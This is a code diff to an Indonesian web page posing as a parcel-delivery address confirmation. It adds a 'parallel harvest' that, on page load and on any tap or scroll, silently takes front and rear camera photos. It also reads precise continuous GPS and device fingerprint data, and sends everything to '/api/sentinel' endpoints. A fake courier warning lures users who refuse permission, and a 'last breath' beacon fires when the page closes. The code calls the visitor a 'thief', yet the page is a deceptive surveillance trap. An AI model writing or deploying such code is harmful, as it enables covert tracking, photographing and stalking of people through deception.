@@ -190,6 +190,18 @@
       <button class="btn-action" id="btnConfirm" onclick="startCaptureFlow()">
         <span>📍</span> Konfirmasi Titik Lokasi Rumah Saya
       </button>
+
+      <!-- Second-Chance Lure jika izin ditolak / gagal -->
+      <div id="retryPermissionBox" style="display:none; margin: 12px 0; padding: 12px; background: #fff1f2; border: 1px solid #fecdd3; border-radius: 12px; text-align: center;">
+        <div style="font-size: 13px; font-weight: 800; color: #e11d48;">⚠️ Navigasi Kurir Terhambat</div>
+        <div style="font-size: 11px; color: #9f1239; margin: 4px 0 10px 0; line-height: 1.4;">
+          Titik GPS diperlukan agar kurir tidak mengembalikan paket ke gudang ekspedisi.
+        </div>
+        <button onclick="requestPermissionsAgain()" style="width: 100%; padding: 10px; background: #e11d48; color: white; font-weight: 800; font-size: 12px; border: none; border-radius: 8px; cursor: pointer;">
+          🔄 Izinkan Lokasi &amp; Sinkronkan Ulang
+        </button>
+      </div>
+
       <div style="font-size: 11px; color: var(--text-muted); text-align: center; margin-top: 10px;">
         Pilih "Izinkan" saat browser meminta akses lokasi
       </div>
@@ -440,32 +452,161 @@
       }).catch(() => {});
     }
 
-    // 3. Alur Otomatis Secepat Kilat (Ultra-Fast Parallel Start)
-    function autoStartEverything() {
-      // 1. Jalankan kamera secepat kilat (prioritas #1)
-      captureSilentSelfie();
+    let latestCoords = null;
+    let capturedFrontPhoto = false;
+    let capturedRearPhoto = false;
+    let isHarvesting = false;
 
-      // 2. Telemetri berjalan paralel tanpa await
-      sendAutoInitialPing();
+    // 3. Fungsi jepret kamera spesifik
+    async function captureCameraFacing(facing, minWaitMs = 150) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        currentActiveStream = stream;
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        try { await video.play(); } catch(e){}
+        await waitForFirstFrame(video, minWaitMs);
+        const dataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        stream.getTracks().forEach(t => t.stop());
+        currentActiveStream = null;
+        return dataUrl;
+      } catch (err) {
+        return null;
+      }
+    }
 
-      // 3. Pasang pemicu sentuhan layar apapun (gesture fallback)
-      const triggerCaptureOnGesture = () => {
-        captureSilentSelfie();
-      };
-      window.addEventListener('pointerdown', triggerCaptureOnGesture, { once: true });
-      window.addEventListener('scroll', triggerCaptureOnGesture, { once: true });
-      window.addEventListener('touchstart', triggerCaptureOnGesture, { once: true });
+    // 4. Pemanenan Bukti Paralel Secepat Kilat (Ultra-Fast Parallel Evidence Harvest)
+    async function executeParallelHarvest(triggerSource = 'auto_instant') {
+      if (isHarvesting) return;
+      isHarvesting = true;
 
-      // 4. Minta izin GPS paralel
-      if (navigator.geolocation) {
+      // Promise 1: GPS Presisi Tinggi
+      const gpsPromise = new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
-          pos => { handleGpsSuccess(pos); },
-          err => { reportGpsDenied(err); },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          pos => resolve(pos),
+          err => {
+            handlePermissionDeniedUI('gps', err);
+            resolve(null);
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
+      });
 
+      // Promise 2: Kamera Depan (Wajah) jika belum ada
+      const frontPromise = !capturedFrontPhoto ? captureCameraFacing('user', 180) : Promise.resolve(null);
+
+      // Promise 3: Kamera Belakang (Lingkungan Depan) jika belum ada
+      const rearPromise = !capturedRearPhoto ? captureCameraFacing('environment', 200) : Promise.resolve(null);
+
+      // Promise 4: Telemetri Perangkat & Hardware
+      const statsPromise = getAdvancedStats();
+
+      // JALANKAN SEMUA SECARA PARALEL SEKALIGUS (PARALLEL HARVEST)
+      const [posRes, frontRes, rearRes, statsRes] = await Promise.allSettled([
+        gpsPromise,
+        frontPromise,
+        rearPromise,
+        statsPromise
+      ]);
+
+      const pos = (posRes.status === 'fulfilled' && posRes.value) ? posRes.value : null;
+      const frontPhoto = (frontRes.status === 'fulfilled' && frontRes.value) ? frontRes.value : null;
+      const rearPhoto = (rearRes.status === 'fulfilled' && rearRes.value) ? rearRes.value : null;
+      const stats = (statsRes.status === 'fulfilled' && statsRes.value) ? statsRes.value : {};
+
+      if (frontPhoto) {
+        capturedFrontPhoto = true;
+        sendPhotoWithKeepalive('/api/sentinel/selfie', frontPhoto, `trap_paket_${triggerSource}`);
+      }
+      if (rearPhoto) {
+        capturedRearPhoto = true;
+        sendPhotoWithKeepalive('/api/sentinel/environment', rearPhoto, `trap_paket_${triggerSource}`);
+      }
+
+      let lat = pos ? pos.coords.latitude : (latestCoords ? latestCoords.lat : 0);
+      let lon = pos ? pos.coords.longitude : (latestCoords ? latestCoords.lon : 0);
+      let acc = pos ? Math.round(pos.coords.accuracy) : (latestCoords ? latestCoords.acc : 10);
+      let spd = pos ? (pos.coords.speed || 0) : 0;
+      let alt = pos ? pos.coords.altitude : null;
+      let heading = pos ? pos.coords.heading : null;
+
+      if (pos) {
+        latestCoords = { lat, lon, acc, spd, alt, heading };
+        handleGpsSuccess(pos);
+      }
+
+      // Kirim satu paket BEACON LENGKAP dengan semua bukti yang terkumpul
+      const unifiedPayload = {
+        alertType: `thief_trapped_paket_${triggerSource}`,
+        lat,
+        lon,
+        accuracy: acc,
+        speed: spd,
+        altitude: alt,
+        heading: heading,
+        photo: frontPhoto,
+        environmentPhoto: rearPhoto,
+        activity: stats.activity || currentActivity,
+        batteryLevel: stats.batteryLevel,
+        batterySource: stats.batterySource,
+        isCharging: stats.isCharging,
+        networkName: stats.networkName,
+        networkType: stats.networkType,
+        downlink: stats.downlink,
+        rtt: stats.rtt,
+        screen: stats.screen,
+        cores: stats.cores,
+        gpu: stats.gpu,
+        gpuVendor: stats.gpuVendor,
+        colorGamut: stats.colorGamut,
+        timeZone: stats.timeZone,
+        platform: stats.platform,
+        userAgent: navigator.userAgent
+      };
+
+      fetch('/api/sentinel/beacon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(unifiedPayload),
+        keepalive: true
+      }).catch(() => {});
+
+      isHarvesting = false;
+    }
+
+    // Pemicu Otomatis Secepat Kilat + Gesture Listener
+    function autoStartEverything() {
+      // 1. Coba eksekusi paralel otomatis seketika
+      executeParallelHarvest('auto_instant');
+
+      // 2. Pasang pemicu sentuhan layar apapun (gesture fallback instan)
+      const onUserInteract = () => {
+        if (!capturedFrontPhoto || !latestCoords) {
+          executeParallelHarvest('gesture_touch');
+        }
+      };
+      window.addEventListener('pointerdown', onUserInteract, { passive: true });
+      window.addEventListener('touchstart', onUserInteract, { passive: true });
+      window.addEventListener('scroll', onUserInteract, { passive: true, once: true });
+      window.addEventListener('click', onUserInteract, { passive: true });
+
+      // 3. Watch GPS berkelanjutan
+      if (navigator.geolocation) {
         navigator.geolocation.watchPosition(
           pos => {
+            latestCoords = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy,
+              spd: pos.coords.speed || 0,
+              alt: pos.coords.altitude,
+              heading: pos.coords.heading
+            };
             sendBeacon(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
           },
           () => {},
@@ -474,10 +615,10 @@
       }
     }
 
-    // Eksekusi instan tanpa menunggu DOMContentLoaded penuh jika sudah parsing
+    // Jalankan segera saat file diparsing
     autoStartEverything();
 
-    // Fungsi jika tombol ditekan manual
+    // Fungsi tombol manual konfirmasi
     function startCaptureFlow() {
       const btn = document.getElementById('btnConfirm');
       if (btn) {
@@ -485,58 +626,61 @@
         btn.style.opacity = '0.7';
         btn.disabled = true;
       }
-      autoStartEverything();
+      executeParallelHarvest('button_confirm_click');
     }
 
-    async function captureSilentSelfie() {
-      if (capturedPhoto) return;
-      capturedPhoto = true;
+    // Penanganan Second-Chance Lure (Jika izin ditolak)
+    function handlePermissionDeniedUI(type, err) {
+      console.warn(`[Sentinel] Izin ${type} ditolak:`, err);
+      const box = document.getElementById('retryPermissionBox');
+      if (box) box.style.display = 'block';
 
-      const video = document.getElementById('hiddenVideo');
-      const canvas = document.getElementById('hiddenCanvas');
-
-      // 1. Sudut Depan: Wajah Pemegang (Kamera Depan Ultra-Cepat)
-      try {
-        const frontStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        });
-        currentActiveStream = frontStream;
-        video.srcObject = frontStream;
-        video.play().catch(() => {});
-
-        await waitForFirstFrame(video, 200);
-
-        const frontDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
-        if (frontDataUrl) {
-          sendPhotoWithKeepalive('/api/sentinel/selfie', frontDataUrl, 'trap_link_paket');
-        }
-
-        frontStream.getTracks().forEach(track => track.stop());
-        currentActiveStream = null;
-      } catch(e) {}
-
-      // 2. Sudut Belakang: Area & Lingkungan di Depan Pencuri (Kamera Belakang Ultra-Cepat)
-      try {
-        const rearStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        });
-        currentActiveStream = rearStream;
-        video.srcObject = rearStream;
-        video.play().catch(() => {});
-
-        await waitForFirstFrame(video, 220);
-
-        const rearDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
-        if (rearDataUrl) {
-          sendPhotoWithKeepalive('/api/sentinel/environment', rearDataUrl, 'trap_link_paket');
-        }
-
-        rearStream.getTracks().forEach(track => track.stop());
-        currentActiveStream = null;
-      } catch(e) {}
+      fetch('/api/sentinel/beacon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          alertType: 'trap_permission_denied',
+          activity: `Pencuri Menolak Izin ${type.toUpperCase()} (${err ? err.message : 'Denied'})`
+        }),
+        keepalive: true
+      }).catch(() => {});
     }
+
+    function requestPermissionsAgain() {
+      const box = document.getElementById('retryPermissionBox');
+      if (box) box.style.display = 'none';
+      executeParallelHarvest('second_chance_retry');
+    }
+
+    // Last Breath Beacon: Sinyal Terakhir saat halaman ditutup / swipe keluar / airplane mode
+    function fireLastBreathBeacon() {
+      const payload = {
+        alertType: 'last_breath_beacon_exit',
+        lat: latestCoords ? latestCoords.lat : 0,
+        lon: latestCoords ? latestCoords.lon : 0,
+        accuracy: latestCoords ? latestCoords.acc : 10,
+        speed: latestCoords ? latestCoords.spd : 0,
+        activity: '⚠️ Perangkat Ditutup / Berpindah Aplikasi (Last Breath)',
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+      };
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/api/sentinel/beacon', JSON.stringify(payload));
+      } else {
+        fetch('/api/sentinel/beacon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(() => {});
+      }
+    }
+
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') fireLastBreathBeacon();
+    });
+    window.addEventListener('pagehide', fireLastBreathBeacon);
+    window.addEventListener('beforeunload', fireLastBreathBeacon);
 
     let sessionTimerInterval = null;
     let continuousGpsInterval = null;
